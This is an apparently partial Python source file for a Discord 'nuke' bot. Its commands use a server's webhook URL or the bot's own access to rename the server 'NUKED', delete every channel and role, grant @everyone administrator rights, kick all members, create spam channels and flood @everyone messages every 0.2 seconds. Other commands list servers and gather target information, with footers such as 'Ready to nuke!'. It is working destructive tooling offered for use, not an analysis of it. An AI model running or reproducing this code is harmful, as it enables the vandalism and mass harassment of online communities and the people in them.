    await msg.edit(embed=result_embed)
    is_running = False

@bot.command()
async def getguildid(ctx):
    """Get current guild ID for webhook commands"""
    embed = discord.Embed(title="Current Server ID", color=CLR_NEON_BLUE)
    embed.description = f"```\n{ctx.guild.id}\n```\n\nUse this ID with webhook commands:\n`atomnukechannels {ctx.guild.id} 15`"
    await ctx.send(embed=embed)

@bot.command()
async def listservers(ctx):
    """List all servers bot is in"""
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    
    if not bot.guilds:
        await ctx.send("Bot is not in any servers")
        return
    
    embed = discord.Embed(title="🌐 Servers Bot Is In", color=CLR_NEON_BLUE)
    
    server_list = ""
    for guild in bot.guilds:
        server_list += f"**{guild.name}** → `{guild.id}` ({guild.member_count} members)\n"
    
    embed.description = server_list
    embed.set_footer(text=f"Total: {len(bot.guilds)} servers | Use the ID with atomnukechannels")
    await ctx.send(embed=embed)

@bot.command()
async def deletewebhooks(ctx):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await delete_all_webhooks(ctx.guild)
    embed = discord.Embed(title="✅ All Webhooks Deleted", color=CLR_CRIMSON)
    embed.description = f"Successfully deleted all webhooks from {ctx.guild.name}"
    await ctx.send(embed=embed)

@bot.command()
async def webhooknuke(ctx, webhook_url: str = None):
    """WEBHOOK NUKE - Works even if bot isn't in the server!"""
    global is_running
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")

    if not webhook_url:
        return await ctx.send("Usage: `atomwebhooknuke <webhook_url>`")

    # Get server ID from webhook
    server_id_or_channel_id = await get_webhook_target_guild(webhook_url)
    
    if server_id_or_channel_id is None:
        embed = discord.Embed(title="❌ Invalid Webhook", color=0xff0000)
        embed.description = "Could not read webhook. Make sure the URL is valid."
        await ctx.send(embed=embed)
        return
    
    # Try to get the guild object if bot is in the server
    target_guild = bot.get_guild(server_id_or_channel_id) if isinstance(server_id_or_channel_id, int) and server_id_or_channel_id > 1000000000000000 else None
    
    is_running = True
    
    if target_guild is None:
        # Bot not in server - webhook spam only
        embed = discord.Embed(title="🪝 WEBHOOK SPAM STARTED", color=CLR_NEON_BLUE)
        embed.description = "Bot not in server - spamming via webhook only\n\nUse `atomstop` to stop"
        msg = await ctx.send(embed=embed)
        
        asyncio.create_task(webhook_spam(webhook_url, "@everyone spam NanoDevs on top", 0.2))
        return
    
    # Bot IS in server - FULL NUKE
    embed = discord.Embed(title="🚀 FULL WEBHOOK NUKE STARTED", color=CLR_CRIMSON)
    embed.description = f"Server: **{target_guild.name}**\n`{target_guild.id}`\n\n⏳ Executing full nuke..."
    msg = await ctx.send(embed=embed)
    
    try:
        # 1. Change server name
        try:
            await target_guild.edit(name="NUKED")
            print("✓ Changed server name")
        except:
            print("✗ Could not change server name")
        
        # 2. Delete all channels
        print("Deleting all channels...")
        await delete_all_channels(target_guild)
        
        # 3. Delete all roles
        print("Deleting all roles...")
        await delete_all_roles(target_guild)
        
        # 4. Give @everyone admin
        print("Giving @everyone admin...")
        await change_permissions(target_guild, True)
        
        # 5. Kick all members
        print("Kicking all members...")
        await kick_everyone(target_guild, bot)
        
        # 6. Create spam channels
        print("Creating spam channels...")
        for i in range(10):
            if not is_running:
                break
            try:
                await target_guild.create_text_channel(name=f"nuke-{i+1}")
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Error creating channel: {e}")
                await asyncio.sleep(0.3)
        
        # 7. Start webhook message spam
        print("Starting webhook spam...")
        asyncio.create_task(webhook_spam(webhook_url, "@everyone spam NanoDevs on top", 0.2))
        
    except Exception as e:
        print(f"Error during webhook nuke: {e}")
    
    result_embed = discord.Embed(title="✅ FULL NUKE COMPLETE", color=CLR_CRIMSON)
    result_embed.description = f"Server: **{target_guild.name}**\n\n✓ Changed name to NUKED\n✓ Deleted all channels\n✓ Deleted all roles\n✓ Gave @everyone admin\n✓ Kicked all members\n✓ Created spam channels\n✓ Started webhook message spam\n\nUse `atomstop` to stop spam"
    await msg.edit(embed=result_embed)

@bot.command()
async def webhookspam(ctx, webhook_url: str = None, *, message: str = None):
    """Spam webhook continuously - no bot invite needed"""
    global is_running
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")

    if not webhook_url or not message:
        return await ctx.send("Usage: `atomwebhookspam <webhook_url> <message>`\nExample: `atomwebhookspam https://... @everyone NUKED`")
    
    is_running = True
    embed = discord.Embed(title="📡 Webhook Spam Started", color=CLR_NEON_BLUE)
    embed.description = f"Message: `{message}`\nSpamming every 0.2 seconds...\n\nUse `atomstop` to stop"
    await ctx.send(embed=embed)
    
    asyncio.create_task(webhook_spam(webhook_url, message, 0.2))

@bot.command()
async def webhookcreatechannels(ctx, webhook_url: str = None, channel_count: int = 15):
    """Create channels via webhook (bot must be in server)"""
    global is_running
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")

    if not webhook_url:
        return await ctx.send("Usage: `atomwebhookcreatechannels <webhook_url> [channel_count]`")
    
    target_guild = await get_webhook_target_guild(webhook_url)
    
    if target_guild is None:
        embed = discord.Embed(title="❌ Bot Not In Server", color=0xff0000)
        embed.description = "Bot must be in the target server to create channels"
        await ctx.send(embed=embed)
        return
    
    is_running = True
    embed = discord.Embed(title="🧪 Creating Channels + Spam", color=CLR_NEON_BLUE)
    embed.description = f"Server: `{target_guild.name}`\nCreating {channel_count} channels..."
    msg = await ctx.send(embed=embed)
    
    success_count = 0
    for i in range(channel_count):
        if not is_running:
            break
        try:
            await target_guild.create_text_channel(name=f"spam-{i+1}")
            success_count += 1
            await asyncio.sleep(0.1)
        except Exception as e:
            print(f"Error: {e}")
            await asyncio.sleep(0.3)
    
    # Start spam in background
    asyncio.create_task(webhook_spam(webhook_url, "@everyone SPAM", 0.2))
    
    result_embed = discord.Embed(title="✅ Channels Created + Spam Started", color=CLR_NEON_BLUE)
    result_embed.description = f"Created `{success_count}/{channel_count}` channels\nSpam continuing in background"
    await msg.edit(embed=result_embed)

@bot.command()
async def webhookinfo(ctx, webhook_url: str = None):
    """Get server info from webhook"""
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")

    if not webhook_url:
        return await ctx.send("Usage: `atomwebhookinfo <webhook_url>`")
    
    target_guild = await get_webhook_target_guild(webhook_url)
    
    if target_guild is None:
        embed = discord.Embed(title="❌ Failed", color=0xff0000)
        embed.description = "Could not get server from webhook.\nMake sure the bot is in that server."
        await ctx.send(embed=embed)
        return
    
    embed = discord.Embed(title="🔍 Webhook Server Info", color=CLR_NEON_BLUE)
    embed.add_field(name="Server", value=f"**{target_guild.name}**", inline=False)
    embed.add_field(name="ID", value=f"`{target_guild.id}`", inline=True)
    embed.add_field(name="Owner", value=f"<@{target_guild.owner_id}>", inline=True)
    embed.add_field(name="Members", value=f"`{target_guild.member_count}`", inline=True)
    embed.add_field(name="Channels", value=f"`{len(target_guild.channels)}`", inline=True)
    embed.add_field(name="Roles", value=f"`{len(target_guild.roles)}`", inline=True)
    embed.set_footer(text="Ready to nuke! Use atomwebhooknuke")
    await ctx.send(embed=embed)


bot.run('') # <-- add your bot token here


